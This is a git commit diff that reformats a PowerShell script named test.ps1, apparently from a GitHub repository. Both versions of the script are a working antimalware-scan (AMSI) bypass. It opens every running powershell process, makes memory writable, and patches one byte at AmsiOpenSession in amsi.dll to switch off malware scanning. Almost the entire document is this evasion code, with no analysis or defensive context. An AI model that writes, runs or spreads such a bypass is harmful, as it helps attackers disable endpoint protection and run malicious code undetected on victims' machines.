d2f2432282e38647f0f5997a4da42c61fcc447f6
Fyxs1 <72049952+Fyxs1@users.noreply.github.com>
2025-07-03 16:01:04 +0530

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,21 +1,47 @@
-$null=Read-Host "";Add-Type -TypeDefinition @"
-using System;using System.Diagnostics;using System.Runtime.InteropServices;
-public class T{public const int A=0x8,B=0x10,C=0x20;public const uint D=0x40;
-[DllImport("ntdll.dll")]public static extern int NtOpenProcess(out IntPtr E,uint F,[In]ref G H,[In]ref I J);
-[DllImport("ntdll.dll")]public static extern int NtWriteVirtualMemory(IntPtr K,IntPtr L,byte[] M,uint N,out uint O);
-[DllImport("ntdll.dll")]public static extern int NtClose(IntPtr P);
-[DllImport("kernel32.dll",SetLastError=true)]public static extern IntPtr LoadLibrary(string Q);
-[DllImport("kernel32.dll",SetLastError=true)]public static extern IntPtr GetProcAddress(IntPtr R,string S);
-[DllImport("kernel32.dll",SetLastError=true)]public static extern bool VirtualProtectEx(IntPtr T,IntPtr U,UIntPtr V,uint W,out uint X);
-[StructLayout(LayoutKind.Sequential)]public struct G{public int Y;public IntPtr Z,A,B;public IntPtr C,D;}
-[StructLayout(LayoutKind.Sequential)]public struct I{public IntPtr E,F;}}"@
+$null=Read-Host ""
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+public class T {
+    public const int A=0x8,B=0x10,C=0x20;
+    public const uint D=0x40;
+    [DllImport("ntdll.dll")] public static extern int NtOpenProcess(out IntPtr h,uint a,ref G b,ref I c);
+    [DllImport("ntdll.dll")] public static extern int NtWriteVirtualMemory(IntPtr h,IntPtr a,byte[] b,uint c,out uint d);
+    [DllImport("ntdll.dll")] public static extern int NtClose(IntPtr h);
+    [DllImport("kernel32.dll",SetLastError=true)] public static extern IntPtr LoadLibrary(string s);
+    [DllImport("kernel32.dll",SetLastError=true)] public static extern IntPtr GetProcAddress(IntPtr h,string s);
+    [DllImport("kernel32.dll",SetLastError=true)] public static extern bool VirtualProtectEx(IntPtr h,IntPtr a,UIntPtr b,uint c,out uint d);
+    [StructLayout(LayoutKind.Sequential)] public struct G {
+        public int L;
+        public IntPtr R1,R2,R3;
+        public IntPtr S1,S2;
+    }
+    [StructLayout(LayoutKind.Sequential)] public struct I {
+        public IntPtr U1,U2;
+    }
+}
+"@
 function p{param([int]$x)
-$y=[byte]0xEB;$z=New-Object T+G;$a=New-Object T+I;$a.E=[IntPtr]$x;$a.F=[IntPtr]::Zero;$z.Y=[Runtime.InteropServices.Marshal]::SizeOf($z)
-$b=[IntPtr]::Zero;$c=[T]::NtOpenProcess([ref]$b,[T]::A -bor [T]::B -bor [T]::C,[ref]$z,[ref]$a);if($c -ne 0){return}
-$d=[T]::LoadLibrary("amsi.dll");if($d -eq [IntPtr]::Zero){[T]::NtClose($b);return}
-$e=[T]::GetProcAddress($d,"AmsiOpenSession");if($e -eq [IntPtr]::Zero){[T]::NtClose($b);return}
-$f=[IntPtr]($e.ToInt64()+3);$g=[UInt32]0;$h=[UIntPtr]::new(1)
-$i=[T]::VirtualProtectEx($b,$f,$h,[T]::D,[ref]$g);if(-not $i){[T]::NtClose($b);return}
-$j=[UInt32]0;$k=[T]::NtWriteVirtualMemory($b,$f,[byte[]]@($y),1,[ref]$j)
-$l=[T]::VirtualProtectEx($b,$f,$h,$g,[ref]$g);[T]::NtClose($b)}
-function q{Get-Process|?{$_.ProcessName -eq "powershell"}|%{p -x $_.Id}};q
+$b=[byte]0xEB;$o=New-Object T+G;$c=New-Object T+I
+$c.U1=[IntPtr]$x;$c.U2=[IntPtr]::Zero
+$o.L=[Runtime.InteropServices.Marshal]::SizeOf($o)
+$h=[IntPtr]::Zero
+$d=[T]::NtOpenProcess([ref]$h,[T]::A -bor [T]::B -bor [T]::C,[ref]$o,[ref]$c)
+if($d -ne 0){return}
+$m=[T]::LoadLibrary("amsi.dll")
+if($m -eq [IntPtr]::Zero){[T]::NtClose($h);return}
+$a=[T]::GetProcAddress($m,"AmsiOpenSession")
+if($a -eq [IntPtr]::Zero){[T]::NtClose($h);return}
+$p=[IntPtr]($a.ToInt64()+3)
+$g=[UInt32]0
+$s=[UIntPtr]::new(1)
+$v=[T]::VirtualProtectEx($h,$p,$s,[T]::D,[ref]$g)
+if(-not $v){[T]::NtClose($h);return}
+$r=[UInt32]0
+[T]::NtWriteVirtualMemory($h,$p,[byte[]]@($b),1,[ref]$r)
+[T]::VirtualProtectEx($h,$p,$s,$g,[ref]$g)
+[T]::NtClose($h)
+}
+function q{Get-Process | ? { $_.ProcessName -eq "powershell" } | % { p -x $_.Id }}
+q
